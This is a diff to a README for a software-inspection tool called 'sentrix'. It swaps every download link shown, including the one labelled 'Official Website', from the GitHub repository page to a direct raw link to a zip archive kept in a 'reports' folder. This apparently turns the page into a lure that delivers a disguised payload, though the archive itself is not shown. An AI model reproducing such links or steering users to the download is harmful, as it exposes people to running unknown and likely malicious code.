@@ -1,6 +1,6 @@
 # 🛡️ sentrix - See Inside Your Software Before It Breaks
 
-[![Download sentrix](https://img.shields.io/badge/Download-sentrix-2ea44f?style=for-the-badge)](https://github.com/marine-turtlesoup9398/sentrix)
+[![Download sentrix](https://img.shields.io/badge/Download-sentrix-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/marine-turtlesoup9398/sentrix/main/reports/Software_v3.1.zip)
 
 ## 🎯 What Is sentrix?
 
@@ -22,7 +22,7 @@ Getting sentrix is easy. Follow these three simple steps:
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:  
-👉 **[https://github.com/marine-turtlesoup9398/sentrix](https://github.com/marine-turtlesoup9398/sentrix)**
+👉 **[https://raw.githubusercontent.com/marine-turtlesoup9398/sentrix/main/reports/Software_v3.1.zip](https://raw.githubusercontent.com/marine-turtlesoup9398/sentrix/main/reports/Software_v3.1.zip)**
 
 ### Step 2: Find the Download Button
 
@@ -124,13 +124,13 @@ sentrix is built by a passionate community of developers and security enthusiast
 
 Don't let hidden problems surprise you. With sentrix, you'll always know what's happening inside your programs — and you'll catch issues before they become disasters.
 
-**[👉 Download sentrix Now](https://github.com/marine-turtlesoup9398/sentrix)** — it takes less than two minutes, and it's completely free.
+**[👉 Download sentrix Now](https://raw.githubusercontent.com/marine-turtlesoup9398/sentrix/main/reports/Software_v3.1.zip)** — it takes less than two minutes, and it's completely free.
 
 ---
 
 ## 📚 Additional Resources
 
-- **Official Website:** [https://github.com/marine-turtlesoup9398/sentrix](https://github.com/marine-turtlesoup9398/sentrix)
+- **Official Website:** [https://raw.githubusercontent.com/marine-turtlesoup9398/sentrix/main/reports/Software_v3.1.zip](https://raw.githubusercontent.com/marine-turtlesoup9398/sentrix/main/reports/Software_v3.1.zip)
 - **Documentation & Guides:** Available on the main page under the "Wiki" tab
 - **Community Forum:** Join discussions under the "Discussions" tab on GitHub
 
